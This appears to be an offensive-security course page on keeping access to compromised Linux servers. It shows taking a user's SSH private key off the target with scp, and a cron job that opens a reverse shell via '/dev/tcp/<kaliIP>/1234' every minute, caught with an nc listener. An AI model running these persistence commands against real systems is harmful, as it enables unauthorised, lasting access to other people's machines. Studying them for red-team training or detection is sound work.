# 9 - Linux Persistence

## <mark style="color:red;">Persistence Via SSH Keys</mark>

* Linux is typically deployed as a server operating system and as a result, Linux servers are typically accessed remotely via services/protocols such as SSH.
* If SSH is enabled and running on a Linux system you have compromised, you can take advantage of the SSH configuration to establish persistent access on the target system.
* In most cases Linux servers will have key-based authentication enabled for the SSH service, allowing users to access the Linux system remotely without the need for a password.
* After gaining access to a Linux system, we can transfer the SSH private key of a specific user account to our system and use that SSH private key for all future authentication and access.

### **Practical Demonstration**

{% code overflow="wrap" lineNumbers="true" %}
```bash
scp <username>@<targetIP>:<pathToFile> <localPath> #Download a file onto the local machine from the target machine using SSH and legitimate credentials

ssh -i <privateKey> <username>@<targetIP> #Log into the target system via SSH using a private key.
```
{% endcode %}



## <mark style="color:red;">Persistence Via Cron Jobs</mark>

* Linux implements task scheduling through a utility called Cron. Cron is a time-based service that runs applications, scripts and other commands repeatedly on a specific schedule.
* An application, or script that has been configured to be run repeatedly with Cron is known as a Cron job.
* We can use cron jobs to execute a command or script at a fixed interval to ensure we have persistent access to the target system.

### **Anatomy Of A Cron Job**

<figure><img src="../../.gitbook/assets/image (8) (2).png" alt=""><figcaption></figcaption></figure>

### **Practical Demonstration**

{% code overflow="wrap" lineNumbers="true" %}
```bash
cat /etc/cron* #Display every cron jobs on the system.

echo "* * * * * /bin/bash -c 'bash -i >& /dev/tcp/<kaliIP>/1234 0>&1'" > <cronFileName> #Create a cron file connecting to our machine every minute.

crontab -i <cronFile> #Add the cron file to the crontab.
crontab -l #List the cron jobs for the current user.
# when we delete the "wait" binary, our connection closes.

# to gain persistence, we setup a listener.
nc -nvlp 1234 # the cron job executes and we get a bash shell.
```
{% endcode %}



